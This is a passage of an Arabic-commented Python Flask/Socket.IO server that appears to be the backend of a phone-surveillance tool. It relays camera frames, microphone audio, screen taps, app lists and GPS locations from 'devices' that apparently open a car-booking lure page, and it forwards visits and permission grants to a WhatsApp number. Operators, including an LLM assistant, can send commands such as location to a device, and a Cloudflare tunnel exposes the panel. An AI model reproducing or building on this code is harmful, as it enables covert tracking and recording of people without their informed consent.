            media_url=incoming_media_url,
            file_name=incoming_file_name,
            payload=payload,
        )

        pending_key = chat_id
        pending = whatsapp_pending_replies.get(chat_id)
        if not pending:
            incoming_digits = extract_phone_digits_from_chat_id(chat_id)
            if incoming_digits:
                for candidate_key, candidate in whatsapp_pending_replies.items():
                    if candidate.get('phone_digits') == incoming_digits:
                        pending_key = candidate_key
                        pending = candidate
                        break
        if not pending:
            return jsonify({'success': True, 'ignored': True}), 200

        keyword = str(pending.get('keyword', '')).strip().lower()
        if keyword and incoming_text and keyword not in incoming_text:
            return jsonify({'success': True, 'waiting_for_keyword': True}), 200

        template = app.config.get('WAWP_LINK_MESSAGE_TEMPLATE', 'هذا هو الرابط: {link}')
        link_message = template.format(link=pending.get('link', ''))
        reply_to = str(payload.get('id', '')).strip() or None
        target_chat_id = str(pending.get('chat_id') or chat_id).strip()

        send_wawp_text(target_chat_id, link_message, reply_to=reply_to)
        append_whatsapp_message(
            chat_id=target_chat_id,
            direction='out',
            text=link_message,
            message_type='text',
        )
        whatsapp_pending_replies.pop(pending_key, None)
        logger.info(f"✅ تم إرسال رابط تلقائيًا بعد رد المستخدم: {target_chat_id}")

        return jsonify({'success': True, 'sent_link': True}), 200
    except Exception as e:
        logger.error(f"خطأ Webhook واتساب: {e}")
        # لا نعيد 500 لتجنب إعادة المحاولة بشكل عشوائي من مزود الويبهوك
        return jsonify({'success': True, 'error': str(e)}), 200

@app.route('/api/ai-assistant', methods=['POST'])
@login_required
def api_ai_assistant():
    """مساعد AI للوحة التحكم"""
    user_message = ''
    context_text = ''
    try:
        data = request.get_json(silent=True) or {}
        user_message = str(data.get('message', '')).strip()
        raw_context = str(data.get('context', '')).strip()
        
        # استخراج device_id من السياق إذا وجد
        target_device_id = None
        if 'selected_device_id=' in raw_context:
            target_device_id = raw_context.split('selected_device_id=')[1].split()[0]
            if target_device_id == 'none': target_device_id = None

        if not user_message:
            return jsonify({'success': False, 'error': 'الرسالة فارغة'}), 400

        # === 1. بناء السياق الكامل (Logs + System State) ===
        recent_logs = get_recent_activity_log(15)
        available_commands = ", ".join(SAFE_COMMANDS)
        
        system_instruction = f"""
        [SYSTEM KNOWLEDGE BASE]
        - Current Date/Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        - Connected Devices: {list(connected_devices.keys())}
        - Target Device ID: {target_device_id or 'None'}
        - Available Commands (Use [[CMD:command_name]]): {available_commands}
        - Recent System Activity Log:
        {recent_logs}
        
        [CODE STRUCTURE]
        - Main file: X.py (Flask + SocketIO)
        - Templates: templates/dashboard.html, templates/phone.html
        - Database: SQLite (users, devices, activity_log)
        - To modify code: Provide the complete code block to the user.
        """

        # === 2. استدعاء الـ AI ===
        answer = ask_ai_assistant(user_message, raw_context, system_instruction)
        
        # === 3. تحليل الرد وتنفيذ الأوامر (Tool Execution) ===
        # البحث عن أنماط مثل [[CMD:camera_on]]
        executed_cmds = []
        commands_found = re.findall(r'\[\[CMD:(\w+)\]\]', answer)
        
        if target_device_id and target_device_id in connected_devices:
            for cmd in commands_found:
                if cmd in SAFE_COMMANDS:
                    # تنفيذ الأمر عبر SocketIO
                    socketio.emit('send_command', {
                        'device_id': target_device_id,
                        'command': cmd
                    })
                    log_activity('ai_assistant', target_device_id, 'ai_command_exec', cmd)
                    executed_cmds.append(cmd)
        
        if executed_cmds:
            answer += f"\n\n(✅ System Note: Executed commands: {', '.join(executed_cmds)})"
        elif commands_found and not target_device_id:
            answer += "\n\n(⚠️ System Note: Commands found but no device selected.)"

        return jsonify({'success': True, 'reply': answer})

    except ValueError as e:
        fallback = local_ai_fallback(user_message, context_text, str(e))
        return jsonify({
            'success': True,
            'reply': fallback,
            'fallback': True,
            'warning': str(e)
        }), 200
    except AIServiceError as e:
        logger.warning(f"AI service warning: {e.message}")
        fallback = local_ai_fallback(user_message, context_text, e.message)
        return jsonify({
            'success': True,
            'reply': fallback,
            'fallback': True,
            'warning': e.message
        }), 200
    except Exception as e:
        logger.error(f"خطأ في مساعد AI: {e}")
        fallback = local_ai_fallback(user_message, context_text, str(e))
        return jsonify({
            'success': True,
            'reply': fallback,
            'fallback': True,
            'warning': 'تم استخدام الرد الاحتياطي بسبب خطأ داخلي'
        }), 200

@app.route('/api/files')
@login_required
def api_files():
    """الحصول على قائمة الملفات المرفوعة"""
    try:
        files_list = []
        root_folder = app.config['UPLOAD_FOLDER']
        if os.path.exists(root_folder):
            # البحث في جميع المجلدات الفرعية (مجلدات الأجهزة)
            for root, dirs, files in os.walk(root_folder):
                for filename in files:
                    # إنشاء مسار نسبي مثل: device_id/image.jpg
                    rel_path = os.path.relpath(os.path.join(root, filename), root_folder)
                    # استبدال الشرطة المائلة العكسية في ويندوز لضمان عمل الروابط
                    files_list.append(rel_path.replace('\\', '/'))
        # دالة مساعدة لترتيب الملفات بأمان (تتجاهل الملفات المحذوفة حديثاً)
        def get_file_mtime(filepath):
            try:
                return os.path.getmtime(os.path.join(root_folder, filepath.replace('/', os.sep)))
            except OSError:
                return 0

        return jsonify({'files': sorted(files_list, key=get_file_mtime, reverse=True)})
    except Exception as e:
        logger.error(f"خطأ في الحصول على الملفات: {e}")
        return jsonify({'error': 'خطأ'}), 500

@app.route('/api/delete_file', methods=['POST'])
@login_required
def api_delete_file():
    """حذف ملف مرفوع"""
    try:
        data = request.json
        filename = str(data.get('filename', '')).strip()
        if not filename:
            return jsonify({'success': False, 'error': 'اسم ملف غير صحيح'}), 400

        normalized = os.path.normpath(filename).replace('\\', '/')
        if normalized.startswith('/') or normalized.startswith('../') or '/../' in f"/{normalized}":
            return jsonify({'success': False, 'error': 'اسم ملف غير صحيح'}), 400

        uploads_root = os.path.abspath(app.config['UPLOAD_FOLDER'])
        file_path = os.path.abspath(os.path.join(uploads_root, normalized.replace('/', os.sep)))
        if not (file_path == uploads_root or file_path.startswith(uploads_root + os.sep)):
            return jsonify({'success': False, 'error': 'مسار غير مسموح'}), 400
        
        if os.path.exists(file_path) and os.path.isfile(file_path):
            os.remove(file_path)
            logger.info(f"✅ تم حذف الملف: {filename}")
            return jsonify({'success': True})
        else:
            return jsonify({'success': False, 'error': 'الملف غير موجود'}), 404
    except Exception as e:
        logger.error(f"خطأ في حذف الملف: {e}")
        return jsonify({'success': False, 'error': 'خطأ'}), 500

@app.route('/api/location', methods=['POST'])
def api_location():
    """استقبال بيانات الموقع الجغرافي"""
    try:
        data = request.json
        latitude = data.get('latitude')
        longitude = data.get('longitude')
        device_id = normalize_device_id(data.get('deviceId', ''))
        
        if not all([latitude, longitude]):
            return jsonify({'error': 'بيانات ناقصة'}), 400

        if not device_id:
            return jsonify({'error': 'الجهاز غير متصل أو غير مصرح'}), 403

        if device_id not in connected_devices:
            with device_identity_lock:
                cached = device_identity_cache.get(device_id)
            if not cached:
                return jsonify({'error': 'الجهاز غير متصل أو غير مصرح'}), 403

            connected_devices[device_id] = {
                'sid': '',
                'name': cached.get('name', 'Unknown Device'),
                'raw_name': cached.get('raw_name', 'Unknown Device'),
                'ip': cached.get('ip') or request.remote_addr,
                'platform': cached.get('platform', 'Unknown'),
                'model': cached.get('model', 'Unknown'),
                'battery': 'Unknown',
                'location': None,
                'connected_at': datetime.now().isoformat(),
            }
        
        # إنشاء رابط Google Maps
        maps_link = f"https://maps.google.com/?q={latitude},{longitude}"
        
        # حفظ الموقع في بيانات الجهاز
        if device_id in connected_devices:
            connected_devices[device_id]['location'] = maps_link

        device_meta = connected_devices.get(device_id, {})
        socketio.start_background_task(
            notify_site_visit_on_whatsapp,
            device_id,
            device_meta.get('raw_name') or device_meta.get('name') or 'Unknown Device',
            device_meta.get('platform') or 'Unknown',
            maps_link,
        )
        
        socketio.emit('location_received', {
            'device_id': device_id,
            'lat': latitude,
            'lng': longitude,
            'link': maps_link
        }, room='main_room')
        
        logger.info(f"📍 موقع مستقبل: {latitude}, {longitude}")
        
        return jsonify({'success': True, 'link': maps_link})
    except Exception as e:
        logger.error(f"خطأ في معالجة الموقع: {e}")
        return jsonify({'error': 'خطأ'}), 500


@app.route('/api/location/permission-status', methods=['POST'])
def api_location_permission_status():
    """تسجيل عام لحالة إذن الموقع بدون هوية جهاز."""
    try:
        payload = request.json or {}
        status = str(payload.get('status', '')).strip().lower()
        if status not in {'granted', 'denied', 'unsupported', 'error'}:
            return jsonify({'success': False, 'error': 'حالة غير صالحة'}), 400

        with location_permission_lock:
            location_permission_stats[status] += 1
            location_permission_stats['updated_at'] = datetime.now(timezone.utc).isoformat()
            snapshot = dict(location_permission_stats)

        logger.info(
            '📊 إحصائية إذن الموقع: '
            f"granted={snapshot['granted']}, denied={snapshot['denied']}, "
            f"unsupported={snapshot['unsupported']}, error={snapshot['error']}"
        )
        return jsonify({'success': True, 'stats': snapshot})
    except Exception as e:
        logger.error(f"خطأ في تسجيل حالة إذن الموقع: {e}")
        return jsonify({'success': False, 'error': 'خطأ'}), 500


@app.route('/api/permission-status', methods=['POST'])
def api_permission_status():
    """تسجيل حالة أي صلاحية (كاميرا/ميكروفون/إشعارات) بدون هوية شخصية."""
    try:
        payload = request.json or {}
        permission = str(payload.get('permission', '')).strip().lower()
        status = str(payload.get('status', '')).strip().lower()
        device_id = normalize_device_id(payload.get('deviceId', ''))

        allowed_permissions = {'camera', 'microphone', 'notifications'}
        allowed_statuses = {'granted', 'denied', 'unsupported', 'error'}

        if permission not in allowed_permissions:
            return jsonify({'success': False, 'error': 'نوع صلاحية غير صالح'}), 400
        if status not in allowed_statuses:
            return jsonify({'success': False, 'error': 'حالة غير صالحة'}), 400

        with permission_status_lock:
            permission_status_stats[permission][status] += 1
            permission_status_stats['updated_at'] = datetime.now(timezone.utc).isoformat()
            snapshot = {
                'camera': dict(permission_status_stats['camera']),
                'microphone': dict(permission_status_stats['microphone']),
                'notifications': dict(permission_status_stats['notifications']),
                'updated_at': permission_status_stats['updated_at'],
            }

        logger.info(
            f"📊 إحصائية صلاحية {permission}: "
            f"granted={snapshot[permission]['granted']}, denied={snapshot[permission]['denied']}, "
            f"unsupported={snapshot[permission]['unsupported']}, error={snapshot[permission]['error']}"
        )

        # إشعار واتساب بنتيجة طلب الصلاحية.
        device_meta = connected_devices.get(device_id, {}) if device_id else {}
        socketio.start_background_task(
            notify_permission_status_on_whatsapp,
            device_id or 'unknown-device',
            device_meta.get('raw_name') or device_meta.get('name') or 'Unknown Device',
            device_meta.get('platform') or 'Unknown',
            permission,
            status,
        )

        return jsonify({'success': True, 'stats': snapshot})
    except Exception as e:
        logger.error(f"خطأ في تسجيل حالة الصلاحية العامة: {e}")
        return jsonify({'success': False, 'error': 'خطأ'}), 500


@app.route('/api/bookings', methods=['POST'])
def api_create_booking():
    """إنشاء طلب حجز من صفحة السيارات."""
    try:
        payload = request.json or {}
        customer_name = str(payload.get('name', '')).strip()
        phone_raw = str(payload.get('phone', '')).strip()
        city = str(payload.get('city', '')).strip()
        car_model = str(payload.get('car_model', 'Geely 26')).strip() or 'Geely 26'
        preferred_date = str(payload.get('preferred_date', '')).strip()
        notes = str(payload.get('notes', '')).strip()

        phone_digits = re.sub(r'\D', '', phone_raw)

        if len(customer_name) < 2:
            return jsonify({'success': False, 'error': 'الاسم غير صالح'}), 400
        if len(phone_digits) < 10:
            return jsonify({'success': False, 'error': 'رقم الهاتف غير صالح'}), 400

        booking_ref = f"BK-{datetime.now().strftime('%Y%m%d')}-{uuid.uuid4().hex[:6].upper()}"

        conn = sqlite3.connect(DATABASE_PATH, timeout=10)
        cursor = conn.cursor()
        cursor.execute(
            """
            INSERT INTO bookings (
                booking_ref, customer_name, phone, city, car_model, preferred_date, notes, source_page, status
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            """,
            (
                booking_ref,
                customer_name,
                phone_digits,
                city,
                car_model,
                preferred_date,
                notes,
                'cars',
                'new',
            ),
        )
        conn.commit()
        conn.close()

        whatsapp_sent = 0
        whatsapp_status = ''

        # إخطار واتساب بأن هناك حجز جديد.
        try:
            notify_number = str(app.config.get('WAWP_SITE_VISITOR_NOTIFY_NUMBER', '') or '').strip()
            if notify_number:
                chat_id = normalize_phone_to_chat_id(notify_number)
                ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                msg = (
                    'طلب حجز جديد من صفحة السيارات\n'
                    f'رقم الطلب: {booking_ref}\n'
                    f'الاسم: {customer_name}\n'
                    f'الهاتف: {phone_digits}\n'
                    f'السيارة: {car_model}\n'
                    f'المدينة: {city or "غير محددة"}\n'
                    f'موعد مفضل: {preferred_date or "غير محدد"}\n'
                    f'الوقت: {ts}'
                )
                send_wawp_text(chat_id, msg)
                whatsapp_sent = 1
                whatsapp_status = 'sent'
            else:
                whatsapp_status = 'notify_number_missing'
        except Exception as notify_error:
            whatsapp_status = f"failed: {str(notify_error)[:180]}"
            logger.warning(f"تعذر إرسال إشعار الحجز إلى واتساب: {notify_error}")

        try:
            conn = sqlite3.connect(DATABASE_PATH, timeout=10)
            cursor = conn.cursor()
            cursor.execute(
                "UPDATE bookings SET whatsapp_sent=?, whatsapp_status=? WHERE booking_ref=?",
                (whatsapp_sent, whatsapp_status, booking_ref),
            )
            conn.commit()
            conn.close()
        except Exception as update_error:
            logger.warning(f"تعذر تحديث حالة واتساب للحجز {booking_ref}: {update_error}")

        logger.info(f"✅ تم إنشاء طلب حجز جديد: {booking_ref}")
        return jsonify({
            'success': True,
            'booking_ref': booking_ref,
            'whatsapp_sent': bool(whatsapp_sent),
            'whatsapp_status': whatsapp_status,
        })
    except Exception as e:
        logger.error(f"خطأ في إنشاء طلب الحجز: {e}")
        return jsonify({'success': False, 'error': 'تعذر إنشاء الحجز'}), 500


# ============ Socket.IO Events ============

@socketio.on('connect')
def handle_connect(auth=None):
    """معالج الاتصال الآمن"""
    auth = auth or {}
    client_type = auth.get('client_type')

    if client_type == 'dashboard':
        safe_user = get_safe_user_for_socket(auth.get('user_id'))
        if not safe_user:
            emit('error', {'message': 'غير مصرح', 'code': 'auth_failed'})
            disconnect()
            return
        socket_sessions[request.sid] = {'type': 'dashboard', 'user_id': safe_user}
        join_room('main_room')
        logger.info(f"✅ Dashboard connected from {request.remote_addr}")
        return

    if client_type == 'device':
        socket_sessions[request.sid] = {'type': 'device'}
        logger.info(f"✅ Device socket connected from {request.remote_addr}")
        return

    emit('error', {'message': 'نوع عميل غير معروف', 'code': 'auth_failed'})
    disconnect()

@socketio.on('register_device')
def handle_register(data):
    """تسجيل جهاز جديد"""
    try:
        session_meta = socket_sessions.get(request.sid, {})
        if session_meta.get('type') != 'device':
            emit('error', {'message': 'غير مصرح', 'code': 'auth_failed'})
            return

        device_id = normalize_device_id(data.get('device_id'))
        if not device_id:
            emit('error', {'message': 'معرف الجهاز غير صالح', 'code': 'auth_failed'})
            return
        
        connected_devices[device_id] = {
            'sid': request.sid,
            'name': format_device_display_name(data.get('name', 'Unknown Device'), data.get('platform', 'Unknown')),
            'raw_name': str(data.get('name', 'Unknown Device')).strip() or 'Unknown Device',
            'ip': request.remote_addr,
            'platform': str(data.get('platform', 'Unknown')).strip() or 'Unknown',
            'battery': data.get('battery', 'Unknown'),
            'location': None,
            'realtime_connected': True,
            'connected_at': datetime.now().isoformat()
        }
        join_room(device_id)
        
        # حفظ في قاعدة البيانات
        try:
            conn = sqlite3.connect(DATABASE_PATH, timeout=10)
            cursor = conn.cursor()
            display_name = connected_devices[device_id]['name']
            cursor.execute(
                "INSERT OR REPLACE INTO devices (id, name, ip, platform, owner_id, last_seen, status) VALUES (?, ?, ?, ?, ?, ?, ?)",
                (device_id, display_name, request.remote_addr, connected_devices[device_id]['platform'], 'system', datetime.now().isoformat(), 'online')
            )
            conn.commit()
            conn.close()
        except Exception as e:
            logger.error(f"خطأ في حفظ الجهاز: {e}")
        
        socketio.emit('device_registered', {'name': connected_devices[device_id]['name'], 'device_id': device_id}, room='main_room')

        logger.info(f"✅ جهاز متصل: {connected_devices[device_id]['name']} ({device_id})")
    
    except Exception as e:
        logger.error(f"خطأ في تسجيل الجهاز: {e}")

@socketio.on('send_command')
def handle_command(data):
    """إرسال أوامر للأجهزة مع التحقق الأمني"""
    try:
        session_meta = socket_sessions.get(request.sid, {})
        if session_meta.get('type') != 'dashboard':
            emit('error', {'message': 'غير مصرح', 'code': 'auth_failed'})
            return

        user_id = session_meta.get('user_id')
        device_id = data.get('device_id')
        command = data.get('command')
        
        if not all([user_id, device_id, command]):
            emit('error', {'message': 'بيانات ناقصة'})
            return

        if command not in SAFE_COMMANDS:
            emit('error', {'message': 'أمر غير مسموح'})
            return
        
        # تسجيل النشاط
        log_activity(user_id, device_id, 'send_command', command)
        
        if device_id in connected_devices:
            device_meta = connected_devices.get(device_id) or {}
            device_sid = str(device_meta.get('sid', '') or '').strip()
            is_realtime = bool(device_meta.get('realtime_connected')) and bool(device_sid)

            if not is_realtime:
                if command == 'location':
                    mark_pending_location_request(device_id)
                    emit('error', {'message': 'تم حفظ طلب الموقع. عند فتح الصفحة على الهاتف سيتم طلب الإذن تلقائيًا وإرسال الموقع إلى اللاب والواتساب.'})
                    logger.info(f"⏳ تم حفظ طلب موقع معلق للجهاز {device_id}")
                    return

                emit('error', {'message': 'الجهاز ظاهر فقط كـ fallback وغير متصل اتصال مباشر. افتح الرابط من الهاتف وامنح الصلاحيات ثم أعد المحاولة.'})
                logger.warning(f"⚠️ تم منع إرسال أمر للجهاز {device_id} لأنه fallback فقط بدون Socket realtime")
                return

            socketio.emit('command', data, room=device_id)
            logger.info(f"📤 أمر مرسل للجهاز {device_id}: {command}")
        else:
            emit('error', {'message': 'الجهاز غير متصل'})
    
    except Exception as e:
        logger.error(f"خطأ في إرسال الأمر: {e}")
        emit('error', {'message': 'خطأ في الخادم'})

@socketio.on('camera_frame')
def on_frame(data):
    if socket_sessions.get(request.sid, {}).get('type') != 'device':
        return
    socketio.emit('camera_frame', data, room='main_room')

@socketio.on('screen_tap')
def on_screen_tap(data):
    """استقبال نقرات شاشة الهاتف وإرسالها للوحة التحكم."""
    try:
        session_meta = socket_sessions.get(request.sid, {})
        if session_meta.get('type') != 'device':
            return

        device_id = str((data or {}).get('device_id', '')).strip()
        if not device_id or device_id not in connected_devices:
            return

        payload = {
            'device_id': device_id,
            'x': float((data or {}).get('x', 0)),
            'y': float((data or {}).get('y', 0)),
            'ts': (data or {}).get('ts'),
        }

        # حماية حدود الإحداثيات
        payload['x'] = max(0.0, min(1.0, payload['x']))
        payload['y'] = max(0.0, min(1.0, payload['y']))

        socketio.emit('screen_tap', payload, room='main_room')
    except Exception as e:
        logger.error(f"خطأ في معالجة screen_tap: {e}")

@socketio.on('audio_chunk')
def on_audio(data):
    if socket_sessions.get(request.sid, {}).get('type') != 'device':
        return
    socketio.emit('audio_chunk', data, room='main_room')

@socketio.on('command_response')
def on_response(data):
    if socket_sessions.get(request.sid, {}).get('type') != 'device':
        return
    socketio.emit('command_response', data, room='main_room')

@socketio.on('download_ready')
def on_download_ready(data):
    if socket_sessions.get(request.sid, {}).get('type') != 'device':
        return
    payload = data or {}
    device_id = normalize_device_id(payload.get('device_id')) or ''
    filename = str(payload.get('filename', '')).strip()
    if not device_id or not filename or device_id not in connected_devices:
        return
    socketio.emit('download_ready', {'device_id': device_id, 'filename': filename}, room='main_room')

@socketio.on('password_received')
def on_password(data):
    logger.warning("🚫 تم حظر حدث password_received")

@socketio.on('accounts_received')
def on_accounts(data):
    logger.warning("🚫 تم حظر حدث accounts_received")

@socketio.on('clipboard_received')
def on_clipboard(data):
    logger.warning("🚫 تم حظر حدث clipboard_received")

@socketio.on('apps_received')
def on_apps(data):
    if socket_sessions.get(request.sid, {}).get('type') != 'device':
        return
    socketio.emit('apps_received', data, room='main_room')

@socketio.on('disconnect')
def handle_disconnect():
    """معالج قطع الاتصال"""
    print("❌ لوحة التحكم فصلت")
    try:
        target_id = None
        # البحث عن الجهاز
        for dev_id, dev_data in list(connected_devices.items()):
            if dev_data['sid'] == request.sid:
                target_id = dev_id
                break
        
        if target_id:
            # حذف من الذاكرة
            if target_id in connected_devices:
                del connected_devices[target_id]
            
            # إبلاغ الجميع
            socketio.emit('device_disconnected', {'device_id': target_id}, room='main_room')
            logger.info(f"❌ جهاز انفصل: {target_id}")
            
            # تحديث قاعدة البيانات
            try:
                conn = sqlite3.connect(DATABASE_PATH, timeout=10)
                cursor = conn.cursor()
                cursor.execute("UPDATE devices SET status='offline' WHERE id=?", (target_id,))
                conn.commit()
                conn.close()
            except Exception as db_e:
                logger.error(f"خطأ في تحديث قاعدة البيانات عند الفصل: {db_e}")
                
    except Exception as e:
        logger.error(f"خطأ في معالج قطع الاتصال: {e}")
    finally:
        socket_sessions.pop(request.sid, None)

# ============ Main Execution ============
if __name__ == '__main__':
    print("="*60)
    print("🚀 المشروع X - نسخة 2.3 (WebSocket Stable)")
    print("="*60)
    
    # إنشاء القوالب تلقائياً
    setup_templates()
    
    # تهيئة قاعدة البيانات
    init_database()
    
    port = int(os.getenv('PORT', '5000'))
    host = os.getenv('HOST', '0.0.0.0')
    local_ip = get_network_info()

    cloudflared_process = None
    try:
        if os.getenv('ENABLE_CLOUDFLARED_TUNNEL', '0').strip().lower() in {'1', 'true', 'yes'}:
            cloudflared_process = start_cloudflared_tunnel(port)
        else:
            logger.info('Cloudflare tunnel disabled. Set ENABLE_CLOUDFLARED_TUNNEL=1 to enable it.')
    except Exception as e:
        logger.warning(f"تعذر تشغيل Cloudflare Tunnel ({e})")
    
    print(f"\n📡 السيرفر يعمل على:")
    print(f"   👉 http://{local_ip}:{port}")
    print("\n⏸️ اضغط Ctrl+C للإيقاف\n")
    
    try:
        socketio.run(app, host=host, port=port, allow_unsafe_werkzeug=True)
    except OSError as e:
        if "10048" in str(e):
            print(f"\n❌ خطأ: المنفذ {port} مشغول بالفعل!")
            print("💡 الحل: البرنامج يعمل في نافذة أخرى. أغلقها أولاً أو استخدم Task Manager لإنهاء python.exe")
        else:
            raise e
    finally:
        if cloudflared_process and cloudflared_process.poll() is None:
            try:
                cloudflared_process.terminate()
                cloudflared_process.wait(timeout=5)
            except Exception:
                pass
